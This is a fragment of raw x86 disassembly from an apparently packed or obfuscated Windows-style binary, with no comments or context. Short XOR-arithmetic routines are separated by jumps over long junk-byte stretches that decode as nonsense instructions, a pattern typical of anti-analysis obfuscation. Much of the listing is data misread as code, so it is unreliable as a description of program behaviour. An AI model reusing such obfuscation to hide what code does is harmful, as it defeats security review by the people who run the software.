  402abf:	xor    edi,eax
  402ac1:	add    edi,DWORD PTR [ebp-0x14]
  402ac4:	mov    ebx,DWORD PTR [ebp-0x1c]
  402ac7:	mov    BYTE PTR [edi+ebx*1+0x32729e],dl
  402ace:	mov    edx,DWORD PTR [ebp-0x44]
  402ad1:	mov    edi,DWORD PTR [ebp-0xc]
  402ad4:	xor    edx,eax
  402ad6:	xor    edi,eax
  402ad8:	add    edx,ecx
  402ada:	add    edi,ecx
  402adc:	imul   edx,edi
  402adf:	add    edx,DWORD PTR [ebp-0x14]
  402ae2:	mov    DWORD PTR [ebp-0x14],edx
  402ae5:	mov    edx,DWORD PTR [ebp-0xc]
  402ae8:	mov    edi,DWORD PTR [ebp-0x24]
  402aeb:	xor    edx,eax
  402aed:	add    edx,ecx
  402aef:	jmp    0x402c0f
  402af4:	mov    dl,0x70
  402af6:	mov    bl,0x55
  402af8:	mov    ch,0x55
  402afa:	push   edx
  402afb:	adc    eax,DWORD PTR [edi-0x7070897c]
  402b01:	xchg   ecx,eax
  402b02:	pop    edi
  402b03:	inc    ebp
  402b04:	call   0x7c7f:0x717c7c0d
  402b0b:	jl     0x402b4a
  402b0d:	cwde   
  402b0e:	pop    edx
  402b0f:	loop   0x402b48
  402b11:	ins    DWORD PTR es:[edi],dx
  402b12:	mov    dh,BYTE PTR [ecx-0x79fc1235]
  402b18:	loopne 0x402b37
  402b1a:	call   0x8ff94796
  402b1f:	and    DWORD PTR [eax+esi*2+0x65564429],esp
  402b26:	jne    0x402b55
  402b28:	push   0x25
  402b2a:	shr    DWORD PTR [ebx],cl
  402b2c:	pop    eax
  402b2d:	adc    eax,0x9ff29373
  402b32:	xor    BYTE PTR ds:0x3f561755,al
  402b38:	adc    DWORD PTR [eax],0x6999aa18
  402b3e:	adc    edi,edx
  402b40:	mov    ah,0xa4
  402b42:	daa    
  402b43:	in     al,dx
  402b44:	int    0x39
  402b46:	mov    dh,BYTE PTR [esi]
  402b48:	pop    edi
  402b49:	fadd   st,st(5)
  402b4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b4c:	enter  0xb67c,0x31
  402b50:	ja     0x402b93
  402b52:	sbb    ch,ch
  402b54:	cmp    al,0xfd
  402b56:	out    0x44,eax
  402b58:	pop    ebp
  402b59:	dec    edi
  402b5a:	shl    DWORD PTR [ebx-0x45a45ad1],1
  402b60:	sbb    eax,0x408a5873
  402b65:	cmc    
  402b66:	hlt    
  402b67:	and    edi,DWORD PTR [edi-0x2e]
  402b6a:	inc    esi
  402b6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b6c:	sbb    BYTE PTR [edi+edi*8-0x5515bdfc],dl
  402b73:	pop    edx
  402b74:	or     ah,BYTE PTR [edi]
  402b76:	or     al,0x8f
  402b78:	inc    ebp
  402b79:	xchg   edx,eax
  402b7a:	dec    edi
  402b7b:	dec    ebx
  402b7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b7d:	pop    esp
  402b7e:	dec    esi
  402b7f:	pop    ds
  402b80:	xor    DWORD PTR [edx-0x26],edx
  402b83:	lods   eax,DWORD PTR ds:[esi]
  402b84:	xchg   BYTE PTR es:[edi],al
  402b87:	lea    ebp,[edx+0x4d]
  402b8a:	rcr    ch,0xbb
  402b8d:	or     bh,BYTE PTR [esi+0x1]
  402b90:	ins    DWORD PTR es:[edi],dx
  402b91:	fs sub al,0x3e
  402b94:	jle    0x402bcc
  402b96:	mov    ebp,0x75ea7dd3
  402b9b:	ds add eax,0x75d212ac
  402ba1:	pusha  
  402ba2:	in     eax,dx
  402ba3:	out    0xeb,al
  402ba5:	xlat   BYTE PTR ds:[ebx]
  402ba6:	add    al,0x88
  402ba8:	pop    ebp
  402ba9:	xor    al,0xd3
  402bab:	loop   0x402bf3
  402bad:	dec    eax
  402bae:	or     edx,DWORD PTR [ebp-0x4fd7e76d]
  402bb4:	push   es
  402bb5:	mov    edx,0xf01f0115
  402bba:	jmp    0xbfa560be
  402bbf:	lods   al,BYTE PTR ds:[esi]
  402bc0:	dec    edi
  402bc1:	xchg   edi,eax
  402bc2:	or     ebp,DWORD PTR [edx+0x56f5988a]
  402bc8:	dec    eax
  402bc9:	pop    ebp
  402bca:	fcmovb st,st(6)
  402bcc:	sar    DWORD PTR [ebp-0x72f7f1f8],cl
  402bd2:	pop    es
  402bd3:	jnp    0x402b59
  402bd5:	cmp    BYTE PTR [ebp-0x76cace68],dl
  402bdb:	mov    al,0x58
  402bdd:	aad    0xa2
  402bdf:	dec    esp
  402be0:	fs retf 0x958f
  402be4:	outs   dx,DWORD PTR ds:[esi]
  402be5:	pop    es
  402be6:	jp     0x402bc8
  402be8:	mov    edx,0xb726e5da
  402bed:	add    eax,0xb53197ed
  402bf2:	lods   eax,DWORD PTR ds:[esi]
  402bf3:	jmp    0x402ba8
  402bf5:	(bad)  
  402bf6:	(bad)  
  402bf7:	int    0x9c
  402bf9:	mov    ds:0xe24dc38,eax
  402bfe:	scas   eax,DWORD PTR es:[edi]
  402bff:	pop    edx
  402c00:	jmp    0x402c36
  402c02:	data16 jecxz 0x402c07
  402c05:	test   di,bp
  402c08:	out    dx,al
  402c09:	les    esp,FWORD PTR [ecx]
  402c0b:	out    dx,eax
  402c0c:	xchg   esp,eax
  402c0d:	mov    ecx,0xd7af0f59
  402c12:	mov    edi,DWORD PTR [ebp-0xc]
  402c15:	xor    edi,eax
  402c17:	sub    edx,edi
  402c19:	mov    edi,DWORD PTR [ebp-0xc]
  402c1c:	mov    ebx,DWORD PTR [ebp-0x14]
  402c1f:	xor    edi,eax
  402c21:	add    edi,ecx
  402c23:	imul   edi,ebx
  402c26:	mov    ebx,DWORD PTR [ebp-0x18]
  402c29:	xor    ebx,eax
  402c2b:	sub    edx,ecx
  402c2d:	lea    edi,[edi+ebx*1+0x32729e]
  402c34:	cmp    edi,edx
  402c36:	jbe    0x40295a
  402c3c:	mov    edx,DWORD PTR [ebp-0xc]
  402c3f:	mov    edi,DWORD PTR [ebp-0x24]
  402c42:	xor    edx,eax
  402c44:	add    edx,ecx
  402c46:	imul   edx,edi
  402c49:	mov    edi,DWORD PTR [ebp-0x18]
  402c4c:	xor    edi,eax
  402c4e:	add    edx,edi
  402c50:	mov    edi,DWORD PTR [ebp-0x8]
  402c53:	lea    edx,[edx+edi*1+0x32729e]
  402c5a:	mov    DWORD PTR [ebp-0x8],edx
  402c5d:	mov    edx,DWORD PTR [ebp-0x20]
  402c60:	xor    edx,eax
  402c62:	mov    edi,0xffcd8d62
  402c67:	sub    edi,edx
  402c69:	add    edi,DWORD PTR [ebp-0x10]
  402c6c:	mov    edx,DWORD PTR [ebp-0x20]
  402c6f:	mov    ebx,DWORD PTR [ebp-0x8]
  402c72:	xor    edx,eax
  402c74:	add    edx,ecx
  402c76:	imul   edx,ebx
  402c79:	cmp    edx,edi
  402c7b:	jbe    0x40217b
  402c81:	pop    ebx
  402c82:	pop    edi
  402c83:	leave  
  402c84:	ret    0x8
  402c87:	push   ebp
  402c88:	mov    ebp,esp
  402c8a:	jmp    0x402d8c
  402c8f:	test   al,0x6e
  402c91:	iret   
  402c92:	clc    
  402c93:	fnstsw WORD PTR [ebp-0x55]
  402c96:	outs   dx,BYTE PTR ds:[esi]
  402c97:	ret    
  402c98:	popf   
  402c99:	aam    0x5e
  402c9b:	(bad)  
  402c9c:	out    dx,eax
  402c9d:	jae    0x402c75
  402c9f:	lahf   
  402ca0:	or     al,0x7c
  402ca2:	jl     0x402cf7
  402ca4:	jl     0x402d22
  402ca6:	jl     0x402cd6
  402ca8:	and    DWORD PTR [ebx+0x54a0fde],edx
  402cae:	pop    esp
  402caf:	add    esp,edi
  402cb1:	jl     0x402d17
  402cb3:	xchg   ebx,eax
  402cb4:	cdq    
  402cb5:	addr16 jl 0x402cc6
  402cb8:	xchg   ebp,eax
  402cb9:	jns    0x402c5f
  402cbb:	call   0xa8e3:0x1d6ea47b
  402cc2:	loopne 0x402c7c
  402cc4:	rol    BYTE PTR cs:[ebx+0x7df02426],cl
  402ccb:	xlat   BYTE PTR ds:[ebx]
  402ccc:	mov    al,0xb3
  402cce:	inc    eax
  402ccf:	cwde   
  402cd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cd1:	jle    0x402cf3
  402cd3:	sahf   
  402cd4:	adc    edi,DWORD PTR [eax+ebx*1+0x2b]
  402cd8:	mov    ebp,0x694a1a55
  402cdd:	mov    ebx,0x20d14f98
  402ce2:	push   ebp
  402ce3:	loop   0x402ce5
  402ce5:	xchg   ax,ax
  402ce7:	ss (bad) 
  402ce9:	cld    
  402cea:	gs in  eax,dx
  402cec:	mov    ebp,0x88b427c
  402cf1:	jb     0x402cd6
  402cf3:	jge    0x402d73
  402cf5:	dec    edi
  402cf6:	and    al,0xba
  402cf8:	mov    cl,0x19
  402cfa:	(bad)
  402cfd:	cld    
  402cfe:	ficom  WORD PTR [edx+eiz*4+0x70812901]
  402d05:	idiv   DWORD PTR gs:[ecx+0x3f1f7e71]
  402d0c:	hlt    
  402d0d:	xchg   esp,eax
  402d0e:	mov    bl,0x82
  402d10:	pusha  
  402d11:	mov    esi,0x88df8fe
  402d16:	in     eax,0xb5
  402d18:	cli    
  402d19:	outs   dx,BYTE PTR ds:[esi]
  402d1a:	add    BYTE PTR [ebx+0x15],0x91
  402d1e:	cmp    DWORD PTR [eax+0x5e],edx
  402d21:	inc    edx
  402d22:	xchg   ecx,eax
  402d23:	fcomip st,st(0)
  402d25:	shl    BYTE PTR [edx],cl
  402d27:	jle    0x402cbd
  402d29:	nop
  402d2a:	dec    ebp
  402d2b:	xchg   esi,eax
  402d2c:	in     al,0x78
  402d2e:	out    dx,al
  402d2f:	fwait
  402d30:	mov    esi,0x78ff7fce
  402d35:	jmp    0x402cb9
  402d37:	jno    0x402d44
  402d39:	or     al,0x0
  402d3b:	mov    ebx,0xb558d4b6
  402d40:	add    bl,BYTE PTR [ebx+0x3594f37b]
  402d46:	mov    eax,ds:0x2fa97a8b
  402d4b:	(bad)  
  402d4c:	nop
  402d4d:	stc    
  402d4e:	push   ss
  402d4f:	std    
  402d50:	les    eax,FWORD PTR [ebp+0x28]
  402d53:	dec    eax
  402d54:	add    eax,0xbdf3dc1e
  402d59:	adc    eax,0x96d3655e
  402d5e:	xchg   ebx,eax
  402d5f:	int    0xdd
  402d61:	aaa    
  402d62:	push   ebx
  402d63:	jg     0x402d6c
  402d65:	pop    eax
  402d66:	rcpps  xmm4,XMMWORD PTR [edi+0x1b673470]
  402d6d:	sbb    al,0x81
  402d6f:	or     eax,0xa3a32892
  402d74:	out    dx,al
  402d75:	dec    ebp
  402d76:	in     eax,dx
  402d77:	mov    cl,0x28
  402d79:	into   
  402d7a:	test   DWORD PTR [ecx+0x76c23034],edi
  402d80:	mov    edx,0x4c983db0
  402d85:	fidivr DWORD PTR [esi+0x28]
  402d88:	mov    bl,BYTE PTR [esi+0x4]
  402d8b:	inc    esp
  402d8c:	push   ecx
  402d8d:	and    edx,DWORD PTR ds:0x4275a8
  402d93:	push   ecx
  402d94:	and    DWORD PTR ds:0x427d1f,edi
  402d9a:	mov    eax,0xf89c8535
  402d9f:	mov    ecx,DWORD PTR ds:0x4278ab
  402da5:	mov    ecx,DWORD PTR [ecx]
  402da7:	xor    DWORD PTR ds:0x42c89a,ecx
  402dad:	mov    DWORD PTR [ebp-0x8],eax
  402db0:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  402db7:	jmp    0x402eb9
  402dbc:	aas    
  402dbd:	enter  0x7aef,0xfb
  402dc1:	jge    0x402e10
  402dc3:	jge    0x402db3
  402dc5:	int    0x4c
  402dc7:	jae    0x402da8
  402dc9:	cmp    BYTE PTR [esi],al
  402dcb:	adc    dl,dh
  402dcd:	(bad)  
  402dcf:	jl     0x402e24
  402dd1:	jl     0x402e4f
  402dd3:	jl     0x402dd9
  402dd5:	mov    cl,0xf0
  402dd7:	out    0xc8,eax
  402dd9:	sbb    al,0xd9
  402ddb:	inc    edi
  402ddc:	(bad)  
  402ddd:	inc    ebp
  402ddf:	nop
  402de0:	dec    esi
  402de1:	jnp    0x402e19
  402de3:	sbb    al,0x10
  402de5:	fwait
  402de6:	das    
  402de7:	idiv   esi
  402de9:	mul    edi
  402deb:	and    dh,BYTE PTR [ebx]
  402ded:	cmp    DWORD PTR [edx+0x3],ebx
  402df0:	es pop eax
  402df2:	xchg   edx,eax
  402df3:	hlt    
  402df4:	xor    DWORD PTR [eax*8+0x7d28cfe9],esp
  402dfb:	add    al,0x98
  402dfd:	(bad)  
  402dfe:	mov    ds:0xe8e1f37b,eax
  402e03:	push   ecx
  402e04:	call   0x5f0c8e75
  402e09:	imul   ebx,DWORD PTR [edx-0x6a5e68ae],0xffffff8b
  402e10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e11:	push   cs
  402e12:	mov    edi,0xa42cac88
  402e17:	xchg   ebx,eax
  402e18:	into   
  402e19:	xchg   BYTE PTR [eax+edi*4],ah
  402e1c:	adc    eax,0xd335752d
  402e21:	xchg   edi,eax
  402e22:	inc    edi
  402e23:	dec    edi
  402e24:	jae    0x402ea5
  402e26:	mov    bl,0xab
  402e28:	push   0x33
  402e2a:	test   esi,esi
  402e2c:	fadd   QWORD PTR [eax]
  402e2f:	jo     0x402e7c
  402e31:	inc    edi
  402e32:	call   0xc3f7:0xf3c9c085
  402e39:	or     DWORD PTR [ebx+ebp*4+0x4d],ebp
  402e3d:	mov    cl,0xf6
  402e3f:	je     0x402e1c
  402e41:	cmp    ch,BYTE PTR [edi]
  402e43:	jae    0x402e09
  402e45:	(bad)  
  402e46:	or     DWORD PTR [edx+0x4e],ebp
  402e49:	outs   dx,BYTE PTR ds:[esi]
  402e4a:	inc    esi
  402e4b:	add    eax,0xe06f21e4
  402e50:	xchg   ecx,eax
  402e51:	dec    ecx
  402e52:	xchg   eax,ecx
  402e54:	ret    
  402e55:	dec    edi
  402e56:	fsubr  DWORD PTR [edx+0x6e8226e1]
  402e5c:	sbb    ch,BYTE PTR [ebx-0x13]
  402e5f:	fst    DWORD PTR [ebx-0x34]
  402e62:	jne    0x402e4e
  402e64:	mov    eax,ds:0x8675133
  402e69:	pop    ecx
  402e6a:	popf   
  402e6b:	adc    ecx,ebp
  402e6d:	add    cl,BYTE PTR [edi-0x7]
  402e70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e71:	xchg   esp,eax
  402e72:	into   
  402e73:	dec    ebp
  402e74:	xor    DWORD PTR [ebx],edx
  402e76:	shl    eax,1
  402e78:	mov    esp,0x49736b6f
  402e7d:	mov    ds:0x43866628,al
  402e82:	and    al,0x90
  402e84:	jno    0x402ebf
  402e86:	in     eax,dx
  402e87:	pusha  
  402e88:	neg    BYTE PTR [ecx+eiz*4+0x248a0b3e]
  402e8f:	xchg   ecx,eax
  402e90:	jg     0x402ee6
  402e92:	xor    al,0x83
  402e94:	pop    es
  402e95:	mov    eax,0xf6fcadbe
  402e9a:	add    ebp,DWORD PTR ds:0x42e66e5b
  402ea0:	add    al,0x79
  402ea2:	and    eax,0x291a5a10
  402ea7:	sub    eax,0xf38ea1cc
  402eac:	into   
  402ead:	retf   0xa4b7
  402eb0:	into   
  402eb1:	adc    eax,0xc8f9f6db
  402eb6:	inc    eax
  402eb7:	clc    
  402eb8:	dec    ebp
  402eb9:	mov    edx,DWORD PTR [ebp-0x8]
  402ebc:	neg    DWORD PTR ds:0x4275a0
  402ec2:	push   esi
  402ec3:	jmp    0x402fc5
  402ec8:	xor    BYTE PTR [eax-0x3f],cl
  402ecb:	aaa    
  402ecc:	pop    ecx
  402ecd:	pop    ebp
  402ece:	fimul  DWORD PTR [ebx+0xf]
  402ed1:	mov    eax,ds:0x306b860b
  402ed6:	push   0x7c0ee9a4
  402edb:	jl     0x402f30
  402edd:	jl     0x402f5b
  402edf:	jl     0x402f25
  402ee1:	addr16 pop edi
  402ee3:	inc    edi
  402ee4:	adc    bl,BYTE PTR [ecx-0x5c]
  402ee7:	in     eax,dx
  402ee8:	adc    dl,bh
  402eea:	jp     0x402f2f
  402eec:	push   ss
  402eed:	cmp    al,0x8
  402eef:	inc    eax
  402ef0:	iret   
  402ef1:	xchg   BYTE PTR gs:[edi+0x2c],bh
  402ef5:	jae    0x402f3e
  402ef7:	xchg   ebp,eax
  402ef8:	jno    0x402f3b
  402efa:	mov    cl,0x91
  402efc:	ret    
  402efd:	pop    ebp
  402efe:	stc    
  402eff:	clc    
  402f00:	sbb    al,BYTE PTR [ecx]
  402f02:	fsubr  QWORD PTR [esi+0x74]
  402f05:	mov    edi,0xa318b785
  402f0a:	js     0x402f18
  402f0c:	and    al,0xf0
  402f0e:	xor    BYTE PTR [esi+0x2d841b27],dh
  402f14:	bound  ebp,QWORD PTR [edi-0x56]
  402f17:	xchg   edi,eax
  402f18:	xor    DWORD PTR [edi],esi
  402f1a:	inc    ebp
  402f1b:	scas   al,BYTE PTR es:[edi]
  402f1c:	out    dx,al
  402f1d:	ret    0xc0d9
  402f20:	pop    edi
  402f21:	pop    ebp
  402f22:	pop    ebx
  402f23:	loope  0x402f3f
  402f25:	push   esi
  402f26:	lds    bp,DWORD PTR [edx]
  402f29:	xchg   ebp,eax
  402f2a:	mov    ch,0x99
  402f2c:	rcr    DWORD PTR ds:0x99474938,cl
  402f32:	and    al,0xfc
  402f34:	xchg   esi,eax
  402f35:	xchg   ecx,eax
  402f36:	test   al,0x65
  402f38:	xchg   ebp,eax
  402f39:	inc    edi
  402f3a:	mov    cl,0xf3
  402f3c:	jle    0x402efc
  402f3e:	int3   
  402f3f:	fidivr WORD PTR ds:0xefd973be
  402f45:	cdq    
  402f46:	and    bh,BYTE PTR [eax+0x267a4c6f]
  402f4c:	scas   al,BYTE PTR es:[edi]
  402f4d:	add    al,0x37
  402f4f:	aad    0x44
  402f51:	mov    WORD PTR [edx-0x5383ab31],ds
  402f57:	fstp   QWORD PTR [ebx]
  402f59:	or     BYTE PTR [edi],dl
  402f5b:	clc    
  402f5c:	cwde   
  402f5d:	das    
  402f5e:	cdq    
  402f5f:	mov    dh,0x46
  402f61:	jns    0x402fdd
  402f63:	imul   esp,DWORD PTR [esi-0x2c],0x54e8570a
  402f6a:	sbb    bh,BYTE PTR [esi]
  402f6c:	jp     0x402f81
  402f6e:	(bad)  
  402f6f:	mov    dl,0xa2
  402f71:	std    
  402f72:	xor    ebx,0x9c0a315
  402f78:	add    DWORD PTR [edx],esp
  402f7a:	or     BYTE PTR [esi-0x5a],dh
  402f7d:	and    al,0x9d
  402f7f:	pop    ss
  402f80:	jp     0x402f54
  402f82:	jmp    0x402f89
  402f84:	ret    0xa042
  402f87:	in     eax,0xec
  402f89:	shl    ebp,1
  402f8b:	cmp    ebx,ecx
  402f8d:	jns    0x402fe0
  402f8f:	sub    eax,0x8c3b1ee0
  402f94:	and    eax,0xa7af2ee9
  402f99:	cmp    edx,DWORD PTR [ebx-0x4c7ca9ce]
  402f9f:	pop    ebx
  402fa0:	imul   DWORD PTR [edi-0x27dd8949]
  402fa6:	jle    0x402f9c
  402fa8:	pop    ss
  402fa9:	push   edx
  402faa:	xor    DWORD PTR [edi+ebx*4+0x39],edx
  402fae:	cmp    BYTE PTR [esp+ebp*8+0x195c5ec],dh
  402fb5:	loopne 0x402f87
  402fb7:	sub    BYTE PTR [edx+0x44b4f036],0xa8
  402fbe:	adc    DWORD PTR [ecx],esp
  402fc0:	outs   dx,DWORD PTR ds:[esi]
  402fc1:	and    esi,eax
  402fc3:	jmp    0x751:0x857b966
  402fca:	jmp    0x4030cc
  402fcf:	xlat   BYTE PTR ds:[ebx]
  402fd0:	push   ebp
  402fd1:	imul   ebp,DWORD PTR [eax+0x6d],0xe255ed68
  402fd8:	xor    ecx,DWORD PTR [ecx]
  402fda:	xchg   edx,eax
  402fdb:	push   ebp
  402fdc:	scas   al,BYTE PTR es:[edi]
  402fdd:	xchg   DWORD PTR ds:0x7c7c01cc,edx
  402fe3:	push   ebx
  402fe4:	jl     0x403062
  402fe6:	jl     0x403008
  402fe8:	mov    al,0x3
  402fea:	call   0x1d87:0xf704ebe4
  402ff1:	or     eax,0x10a921b2
  402ff6:	outs   dx,DWORD PTR ds:[esi]
  402ff7:	xchg   esp,eax
  402ff8:	int3   
  402ff9:	mov    cl,0xd2
  402ffb:	mov    dh,0xcf
  402ffd:	add    esi,DWORD PTR [edi]
  402fff:	dec    esi
  403000:	push   edx
  403001:	add    al,0x98
  403003:	adc    BYTE PTR [ecx+ebp*1],al
  403006:	push   es
  403007:	stc    
  403008:	inc    esp
  403009:	push   ecx
  40300a:	push   esp
  40300b:	pop    ebp
  40300c:	jmp    0x43666791
  403011:	out    dx,eax
  403012:	sbb    BYTE PTR [esp+ebp*2],dh
  403015:	jns    0x403033
  403017:	repnz adc BYTE PTR [esi-0xe],ch
  40301b:	aam    0x55
  40301d:	enter  0xb8a8,0xbc
  403021:	mov    ecx,0xdf89fcca
  403026:	push   ss
  403027:	ss cld 
  403029:	nop
  40302a:	jge    0x402fbf
  40302c:	dec    eax
  40302d:	aas    
  40302e:	outs   dx,DWORD PTR ds:[esi]
  40302f:	stos   DWORD PTR es:[edi],eax
  403030:	in     eax,dx
  403031:	push   ebx
  403032:	call   0x5bf33f6
  403037:	jmp    0x6e46:0x5883244f
  40303e:	bound  ebx,QWORD PTR [edx-0x6e]
  403041:	mov    ?,edx
  403043:	daa    
  403044:	(bad)  [edi-0x71]
  403047:	lock jno 0x403093
  40304a:	cli    
  40304b:	jno    0x403015
  40304d:	cs cmc 
  40304f:	lea    edx,[esi]
  403051:	les    esp,FWORD PTR [edi-0x6f2cba8e]
  403057:	jle    0x402ffd
  403059:	inc    ebp
  40305a:	and    al,0x4e
  40305c:	sub    BYTE PTR [ebp-0x65],ch
  40305f:	ror    DWORD PTR [edx-0x3989d96b],1
  403065:	jge    0x403022
  403067:	sub    DWORD PTR [ecx],ebp
  403069:	fld    DWORD PTR [edx+eax*4-0x6a]
  40306d:	imul   eax,DWORD PTR [ebx],0x55cc16f0
  403073:	inc    edx
  403074:	pusha  
  403075:	inc    ebp
  403076:	add    eax,0x123b4399
  40307b:	mov    dl,0x8e
  40307d:	pop    es
  40307e:	dec    edx
  40307f:	cli    
  403080:	cmc    
  403081:	out    dx,eax
  403082:	mov    ds:0xcf78e3f3,eax
  403087:	mov    cl,BYTE PTR [esi-0x23d9f348]
  40308d:	mov    WORD PTR [edx-0x20ca970a],?
  403093:	sub    eax,0xb5d681f
  403098:	dec    edx
  403099:	cld    
  40309a:	retf   0x75ee
  40309d:	inc    ebx
  40309e:	test   BYTE PTR [eax+0x5c],0xa3
  4030a2:	in     eax,0xb3
  4030a4:	xchg   esp,eax
  4030a5:	mov    esi,0xa3044bb
  4030aa:	test   al,0x2b
  4030ac:	dec    ecx
  4030ad:	mov    ebp,0xe17de2f9
  4030b2:	les    esi,FWORD PTR [esp+ecx*8-0x4a]
  4030b6:	and    BYTE PTR [esi+0x5],bh
  4030b9:	xor    al,0xc8
  4030bb:	inc    esi
  4030bc:	lea    eax,[edx-0x3b7d8a33]
  4030c2:	aad    0xa6
  4030c4:	inc    ebx
  4030c5:	rcl    BYTE PTR [eax],1
  4030c7:	xlat   BYTE PTR ds:[ebx]
  4030c8:	pop    edx
  4030c9:	ins    DWORD PTR es:[edi],dx
  4030ca:	bound  ebp,QWORD PTR [ebx+esi*1-0x2f]
  4030ce:	mov    esi,DWORD PTR ds:0x4292a5
  4030d4:	or     DWORD PTR ds:0x4275a8,esi
  4030da:	mov    esi,0x32729e
  4030df:	push   edi
  4030e0:	mov    edi,DWORD PTR [ebp+0x10]
  4030e3:	sub    DWORD PTR ds:0x42c88e,0x427d17
  4030ed:	add    edx,esi
  4030ef:	cmp    edi,edx
  4030f1:	jmp    0x4031f3
  4030f6:	in     eax,0x90
  4030f8:	ds std 
  4030fa:	inc    ecx
  4030fb:	jge    0x4030fa
  4030fd:	test   al,0xb1
  4030ff:	test   BYTE PTR [ebx],0x86
  403102:	jmp    0x7c00:0x23c86a19
  403109:	jl     0x40315e
  40310b:	jl     0x403189
  40310d:	jl     0x403115
  40310f:	hlt    
  403110:	daa    
  403111:	shl    DWORD PTR [edi],0x10
  403114:	inc    esp
  403115:	cmp    BYTE PTR [ecx+eax*1+0x45],ah
  403119:	stos   BYTE PTR es:[edi],al
  40311a:	jno    0x403100
  40311c:	push   es
  40311d:	xor    DWORD PTR [edi+0x3e],esp
  403120:	sbb    BYTE PTR [ebp+0x19],ah
  403123:	popf   
  403124:	xor    eax,0xbfc240
  403129:	jp     0x40318d
  40312b:	mov    cl,0x45
  40312d:	and    eax,0xd1877fc
  403132:	pusha  
  403133:	add    cl,dh
  403135:	in     eax,0x75
  403137:	xchg   ebx,eax
  403138:	ficom  WORD PTR ds:0x926265ce
  40313e:	(bad)  
  40313f:	jmp    0x40316e
  403141:	data16 cmc 
  403143:	and    eax,0xe413098a
  403148:	lea    esi,[ecx-0x47]
  40314b:	xor    ebx,ebx
  40314d:	mov    ecx,0xbe747716
  403152:	mov    ah,bh
  403154:	fnstsw WORD PTR [edi]
  403156:	push   0xffffff93
  403158:	xchg   edx,eax
  403159:	lock add cl,BYTE PTR [edx+0x719cbca6]
  403160:	jge    0x403142
  403162:	test   BYTE PTR [ecx],bl
  403164:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403165:	es lock stc 
  403168:	rcl    ah,cl
  40316a:	adc    DWORD PTR [esi+esi*4-0x18],edi
  40316e:	sbb    BYTE PTR [esp+esi*4],cl
  403171:	or     BYTE PTR [edx],bh
  403173:	js     0x40319b
  403175:	sub    BYTE PTR [ebp+0x17d4e44],dl
  40317b:	stos   BYTE PTR es:[edi],al
  40317c:	fwait
  40317d:	test   edi,edx
  40317f:	(bad)  
  403181:	out    0x28,al
  403183:	sti    
  403184:	add    eax,0x92040687
  403189:	mov    ebp,0xe21d83eb
  40318e:	fsub   st(0),st
  403190:	xor    ebx,edi
  403192:	sbb    al,BYTE PTR [edi+0x5932872e]
  403198:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403199:	adc    bl,BYTE PTR cs:[ecx+0xd5ba13a]
  4031a0:	fwait
  4031a1:	cmp    al,ch
  4031a3:	cdq    
  4031a4:	call   0x8cf6bea0
  4031a9:	arpl   WORD PTR [ebp+0x757ed5ce],bp
  4031af:	imul   ebx,DWORD PTR [edx+0x26],0xa2d8db69
  4031b6:	fwait
  4031b7:	mov    ds:0xe4cdf6db,eax
  4031bc:	dec    ecx
  4031bd:	punpckhdq mm0,QWORD PTR [edx+ecx*2+0x75ef1683]
  4031c5:	or     al,0xa9
  4031c7:	ror    DWORD PTR [edi-0x4a],cl
  4031ca:	pop    esp
  4031cb:	(bad)  
  4031cc:	mov    dh,0xe9
  4031ce:	(bad)  [ecx-0x7b5e4ed7]
  4031d4:	sub    edx,eax
  4031d6:	rcr    DWORD PTR [esi-0x2e],cl
  4031d9:	icebp  
  4031da:	das    
  4031db:	pop    eax
  4031dc:	add    dh,bl
  4031de:	pop    edi
  4031df:	mov    dl,BYTE PTR [esi+0x5072eda7]
  4031e5:	xchg   BYTE PTR fs:[edx],bh
  4031e8:	push   ecx
  4031e9:	aas    
  4031ea:	dec    eax
  4031eb:	sbb    al,0xf7
  4031ed:	pop    ss
  4031ee:	shl    eax,1
  4031f0:	mov    bl,0x51
  4031f2:	or     eax,0x2f7840f
  4031f7:	add    BYTE PTR [eax],al
  4031f9:	adc    edi,DWORD PTR ds:0x4292c1
  4031ff:	mov    edx,DWORD PTR [ebp-0x8]
  403202:	mov    eax,DWORD PTR [ebp-0x4]
  403205:	xor    eax,ecx
  403207:	and    DWORD PTR ds:0x4275a0,0x0
  403211:	jmp    0x403223
  403216:	mov    edi,DWORD PTR ds:0x4275a0
  40321c:	inc    edi
  40321d:	mov    DWORD PTR ds:0x4275a0,edi
  403223:	cmp    DWORD PTR ds:0x4275a0,0x1e
  40322a:	jae    0x40326d
  403230:	cmp    DWORD PTR ds:0x4275a0,0xa
  403237:	jne    0x403248
  40323d:	push   0x444a
  403242:	call   DWORD PTR ds:0x4279cb
  403248:	cmp    DWORD PTR ds:0x4275a0,0x9
  40324f:	jne    0x403262
  403255:	mov    edi,DWORD PTR ds:0x4275a0
  40325b:	inc    edi
  40325c:	mov    DWORD PTR ds:0x4275a0,edi
  403262:	jmp    0x403216
  403267:	or     DWORD PTR ds:0x427d0b,ecx
  40326d:	mov    edi,0xffcd8d62
  403272:	sub    edi,eax
  403274:	add    edi,DWORD PTR [ebp+0x10]
  403277:	or     DWORD PTR ds:0x427d07,0x4292a9
  403281:	xor    edx,ecx
  403283:	jmp    0x403385
  403288:	mov    DWORD PTR [edx-0x34],edi
  40328b:	dec    ebp
  40328c:	jecxz  0x4032fb
  40328e:	popf   
  40328f:	jp     0x40324f
  403291:	sahf   
  403292:	js     0x4032bc
  403294:	xor    eax,0x64e2775
  403299:	add    edi,DWORD PTR [esp+edi*2+0x53]
  40329d:	jl     0x40331b
  40329f:	jl     0x4032ee
  4032a1:	sbb    dl,cl
  4032a3:	jmp    0x403253
  4032a5:	and    eax,0x4cdb586e
  4032aa:	dec    ebx
  4032ab:	mov    bh,0x4a
  4032ad:	popa   
  4032ae:	ja     0x40331f
  4032b0:	sub    al,0xee
  4032b2:	cmp    al,0xaf
  4032b4:	lock or ch,ch
  4032b7:	mov    dl,dh
  4032b9:	stc    
  4032ba:	sbb    ebp,ebp
  4032bc:	pop    ds
  4032bd:	clc    
  4032be:	mov    ebp,0x6d6f5984
  4032c3:	cdq    
  4032c4:	mov    al,0x21
  4032c6:	dec    ecx
